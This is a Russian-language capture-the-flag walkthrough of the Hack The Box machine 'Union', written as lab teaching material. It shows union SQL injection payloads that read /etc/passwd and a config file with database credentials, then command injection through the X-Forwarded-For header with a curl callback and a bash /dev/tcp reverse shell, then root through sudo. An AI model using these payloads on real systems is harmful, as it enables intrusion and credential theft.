# Union (2021)

<figure><img src="../../../.gitbook/assets/image (136).png" alt=""><figcaption></figcaption></figure>

## Ключевые моменты прохождения:

✅ Поэтапно эксплуатируем Union SQL-инъекцию\
✅ Читаем файлы с помощью Union SQL-инъекции\
✅ Читаем php файлы и эксплуатируем RCE через заголовок X-Forwarded-For\
✅ Повышаем наши права до рута с помощью sudo -l

## Разведка

```
$ nmap -sC -sV 10.10.11.128 -oN nmap
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

На машине даются куки - `PHPSESSID`. Это значит, что на сайте есть авторизация.

<figure><img src="../../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

```
$ gobuster dir -u http://10.10.11.128/ -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt -t 128
```

```
/index.php            (Status: 200) [Size: 1220]
/css                  (Status: 301) [Size: 178] [--> http://10.10.11.128/css/]
/firewall.php         (Status: 200) [Size: 13]                                
/config.php           (Status: 200) [Size: 0]                                 
/challenge.php        (Status: 200) [Size: 772]
```

В запросе можно указать один параметр - `player`:

<figure><img src="../../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

При этом, форма подвержена `SQL-инъекции`:

<figure><img src="../../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

При помощи [данной шпаргалки](https://dev.mysql.com/doc/refman/5.7/en/information-schema-schemata-table.html), мы можем увидеть, что есть база данных `mysql`:

```
player=tragernout'union select SCHEMA_NAME from information_schema.schemata -- -
```

<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>

Чтобы увидеть все базы данных, нужно воспользоваться функцией `group_concat()`. Она объединяет строки групп в одну строку:

```
player=tragernout'union select group_concat(SCHEMA_NAME) from information_schema.schemata -- -
```

<figure><img src="../../../.gitbook/assets/image (141).png" alt=""><figcaption></figcaption></figure>

```
Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying.
```

В этих базах данных нет ничего интересного, кроме бд `november`. Можно посмотреть, какие таблицы в ней есть:

```
player=tragernout'union select group_concat(table_name) from information_schema.tables where table_schema like 'november'  -- -
```

<figure><img src="../../../.gitbook/assets/image (142).png" alt=""><figcaption></figcaption></figure>

Получаем флаг:

<figure><img src="../../../.gitbook/assets/image (143).png" alt=""><figcaption></figcaption></figure>

```
UHC{F1rst_5tep_2_Qualify}
```

На `http://10.10.11.128/challenge.php` нужно ввести флаг:

<figure><img src="../../../.gitbook/assets/image (144).png" alt=""><figcaption></figcaption></figure>

Теперь, если просканировать `22 порт`, то он будет открыт:

```console
$ nmap -p 22 10.10.11.128
```

```
PORT   STATE SERVICE
22/tcp open  ssh
```

## Получаем первого юзера

***

С помощью SQL мы можем читать удаленные файлы, например:

```
player=tragernout'union select load_file('/etc/passwd');  -- -
```

<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>

Возможно, на скриншоте плохо видно, но кроме `рута` есть еще два юзера `uhc` и `htb`. Я пытался получить их `id_rsa`, но ничего не вышло. Потом вспомнил, что в `gobuster'е` я получил `config.php`, который сейчас можно прочитать:

```
player=tragernout'union select load_file('/var/www/html/config.php');  -- -
```

<figure><img src="../../../.gitbook/assets/image (146).png" alt=""><figcaption></figcaption></figure>

```php
<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

Для `ssh` подошли следующие креды:

```
uhc:uhc-11qual-global-pw
```

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

## Получаем второго юзера

***

К сожалению, юзер `uhc` предназначен только для того, чтобы прочитать `.php` файлы и `user.txt`. Но файле `firewall.php` можно обнаружить `RCE`:

```php
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
```

Проверить `RCE` легко, например, вот так:

```console
$ python3 -m http.server
```

```console
GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
DNT: 1
Connection: close
Cookie: PHPSESSID=3k79i6c9a3pjq62v03ae5i7iak
Upgrade-Insecure-Requests: 1
Sec-GPC: 1
Cache-Control: max-age=0
X-Forwarded-For: ; curl 10.10.16.89:
```

<figure><img src="../../../.gitbook/assets/image (148).png" alt=""><figcaption></figcaption></figure>

Таким образом можно сделать `reverse shell`:

```
X-Forwarded-For: ;  bash -c "bash -i >& /dev/tcp/10.10.16.89/9898 0>&1";
```

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

## Получаем рута

***

Получение `рута` максимально простое. Если честно, я не знаю, как так получилось, что в medium машине вот такой прив эск. Заключается он в том, что пользователю www-data можно запускать все команды без пароля с привилегиями рута:

```
$ sudo -l
$ sudo su
```

<figure><img src="../../../.gitbook/assets/image (150).png" alt=""><figcaption></figcaption></figure>
